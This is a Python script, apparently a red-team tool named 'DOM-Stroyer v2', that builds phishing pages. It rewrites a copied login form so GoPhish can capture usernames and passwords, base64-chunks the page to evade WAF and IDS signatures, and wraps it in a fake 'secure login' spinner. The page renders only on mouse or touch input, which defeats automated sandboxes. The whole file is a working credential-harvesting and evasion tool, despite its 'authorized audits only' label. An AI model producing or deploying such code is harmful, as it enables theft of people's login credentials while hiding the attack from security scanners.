#!/usr/bin/env python3
"""
# -----------------------------------------------------------------------------
# TOOL: DOM Smuggler Payload Generator (DOM-Stroyer v2)
# AUTHOR: Sebastian Aguilar
# DESCRIPTION: Takes a consolidated HTML template, normalizes its form for C2 
#              capture (like Gophish), and obfuscates the entire payload using 
#              Base64 chunking. Wraps the payload in an evasive JS loader 
#              triggered only by human interaction (anti-sandbox).
# STATUS: Educational & Authorized Audits Only
# -----------------------------------------------------------------------------
"""

import base64
import sys
import re

def build_dom_smuggler_v2(input_file, output_file):
    try:
        # Leemos el archivo con codificación explícita para evitar símbolos raros
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # --- CAPA DE NORMALIZACIÓN UNIVERSAL ---
        # Forzamos POST y limpiamos el action para GoPhish
        content = re.sub(r'<form.*?>', '<form method="POST" action="">', content, flags=re.IGNORECASE)
        
        # Mapeo universal de campos para asegurar captura en GoPhish
        if 'name="username"' not in content and 'name="loginfmt"' not in content:
            content = content.replace('type="email"', 'name="username" type="email"')
            content = content.replace('type="text"', 'name="username" type="text"')
        if 'name="password"' not in content:
            content = content.replace('type="password"', 'name="password" type="password"')

        # --- CAPA DE EVASIÓN ---
        # Codificación y fragmentación (Chunking) para evitar firmas largas
        b64_data = base64.b64encode(content.encode('utf-8')).decode('utf-8')
        chunk_size = 70 
        chunks = [f"'{b64_data[i:i+chunk_size]}'" for i in range(0, len(b64_data), chunk_size)]
        fragmented_payload = " + \n        ".join(chunks)

        # Template de Evasión (Pantalla de carga inicial falsa)
        template = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciando sesión segura...</title>
    <style>
        body, html {{ margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }}
        #ghost-root {{ display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div id="ghost-root">
        <div class="spinner"></div>
        <p style="color: #666; margin-top: 20px; font-size: 14px;">Validando integridad del navegador...</p>
    </div>

    <script>
        // Fragmentación para Bypassear WAF/IDS
        const _DATA = {fragmented_payload};

        function deploy() {{
            try {{
                // Decodificación robusta para evitar el error de "idioma/texto plano"
                const raw = atob(_DATA);
                const bytes = new Uint8Array(raw.length);
                for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
                const decoded = new TextDecoder('utf-8').decode(bytes);
                
                // RECONSTRUCCIÓN NATIVA DEL DOM
                // Abrimos el documento para sobreescribir TODO (limpia el rastro del cargando)
                document.open();
                document.write(decoded);
                document.close();
                
                console.log("[+] DOM Hijacked & Re-rendered.");
            }} catch (e) {{
                // Fallback si falla el decoder avanzado
                document.body.innerHTML = atob(_DATA);
            }}
        }}

        // ACTIVACIÓN HUMANA (Anti-Sandbox)
        window.addEventListener('mousemove', deploy, {{ once: true }});
        window.addEventListener('touchstart', deploy, {{ once: true }});
    </script>
</body>
</html>
"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(template)
        print(f"[+] 'DOM-Stroyer v2' generado exitosamente: {output_file}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("--- DOM SMUGGLER PAYLOAD GENERATOR ---")
    if len(sys.argv) < 3:
        print("Uso: python dom_smuggler.py <entrada.html> <salida.html>")
    else:
        build_dom_smuggler_v2(sys.argv[1], sys.argv[2])
